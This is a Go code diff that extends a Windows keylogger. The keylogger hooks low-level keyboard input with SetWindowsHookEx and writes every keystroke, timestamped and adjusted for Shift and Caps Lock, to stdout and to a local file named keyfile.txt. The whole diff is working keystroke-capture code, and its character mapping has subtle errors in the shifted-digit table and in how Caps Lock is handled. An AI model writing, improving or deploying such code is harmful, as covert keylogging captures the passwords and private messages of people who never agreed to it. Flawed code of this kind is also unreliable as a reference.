@@ -4,7 +4,9 @@ import (
 	"fmt"
 	"os"
 	"syscall"
+	"time"
 	"unsafe"
+	"log"
 
 	"golang.org/x/sys/windows"
 )
@@ -16,6 +18,7 @@ var (
 	procCallNextHookEx      = user32.NewProc("CallNextHookEx")
 	procGetMessageW         = user32.NewProc("GetMessageW")
 	procUnhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
+	procGetKeyState         = user32.NewProc("GetKeyState")
 
 	hook HHOOK
 )
@@ -106,6 +109,8 @@ type MSG struct {
 }
 
 var file *os.File
+var shiftPressed bool
+var capsLockOn bool
 
 func main() {
 	file, _ = os.Create("keyfile.txt")
@@ -121,39 +126,113 @@ func main() {
 	}
 }
 
-// SetWindowsHookEx installs a hook procedure.
 func SetWindowsHookEx(idHook int, lpfn uintptr, hmod uintptr, dwThreadId uint32) HHOOK {
 	ret, _, _ := procSetWindowsHookExW.Call(uintptr(idHook), lpfn, hmod, uintptr(dwThreadId))
 	return HHOOK(ret)
 }
 
-// CallNextHookEx passes the hook information to the next hook procedure in the chain.
+
 func CallNextHookEx(hhk HHOOK, nCode int, wParam WPARAM, lParam LPARAM) LRESULT {
 	ret, _, _ := procCallNextHookEx.Call(uintptr(hhk), uintptr(nCode), uintptr(wParam), uintptr(lParam))
 	return LRESULT(ret)
 }
 
-// LowLevelKeyboardProc is the hook procedure for low-level keyboard input.
+
 func LowLevelKeyboardProc(nCode int, wParam WPARAM, lParam LPARAM) LRESULT {
 	if nCode == HC_ACTION {
 		kbdStruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
 		if wParam == WM_KEYDOWN {
 			vkCode := kbdStruct.VkCode
 
+			// Check for shift and caps lock states
+			shiftPressed := (getKeyState(160) & 0x8000) != 0 || (getKeyState(161) & 0x8000) != 0
+			capsLockOn := (getKeyState(20) & 0x0001) != 0
+
 			value, exists := asciiMap[int(vkCode)]
+			var output string
 			if exists {
-				fmt.Printf("Keydown: %s (0x%04X)\n", value, vkCode)
-				file.WriteString(value)
+				if shiftPressed && !capsLockOn {
+					value = transform(value, shiftPressed)
+				} else if capsLockOn && !shiftPressed {
+					value = transform(value, capsLockOn)
+				}
+				output = fmt.Sprintf("Keydown: %s (0x%04X)", value, vkCode)
 			} else {
-				fmt.Printf("Keydown: Unknown (%d)\n", vkCode)
-				file.WriteString(fmt.Sprint(vkCode))
+				output = fmt.Sprintf("Keydown: Unknown (0x%04X)", vkCode)
+			}
+
+			// Print to stdout
+			fmt.Println(output)
+
+			// Write to file
+			if file != nil {
+				if _, err := file.WriteString(fmt.Sprintf("%v : %v : %v\n", time.Now(), vkCode, output)); err != nil {
+					log.Printf("Error writing to file: %v", err)
+				}
+			} else {
+				log.Println("File handle is nil. Cannot write to file.")
 			}
 		}
 	}
+
 	return CallNextHookEx(hook, nCode, wParam, lParam)
 }
 
-// UnhookWindowsHookEx uninstalls the hook procedure.
+
+func getKeyState(vkCode int) int {
+	ret, _, _ := procGetKeyState.Call(uintptr(vkCode))
+	return int(ret)
+}
+
+
+func transform(s string, shift bool) string {
+	if len(s) != 1 {
+		return s
+	}
+	
+	c := s[0]
+	
+
+	if c >= 'a' && c <= 'z' {
+		if shift {
+			return string(c - ('a' - 'A'))
+		}
+		return s
+	}
+	
+
+	if c >= 'A' && c <= 'Z' {
+		if shift {
+			return s
+		}
+		return string(c + ('a' - 'A'))
+	}
+	
+
+	if c >= '0' && c <= '9' {
+		if shift {
+			return string(" !@#$%^&*()_"[c-'0'])
+		}
+		return s
+	}
+	
+	
+	symbols := "`1234567890-=[]\\;',./"
+	symbolsShift := "~!@#$%^&*()_+{}|:\"<>?"
+	
+	for i := 0; i < len(symbols); i++ {
+		if c == symbols[i] {
+			if shift {
+				return string(symbolsShift[i])
+			}
+			return string(c)
+		}
+	}
+	
+	return s
+}
+
+
 func UnhookWindowsHookEx(hhk HHOOK) bool {
 	ret, _, _ := procUnhookWindowsHookEx.Call(uintptr(hhk))
 	return ret != 0
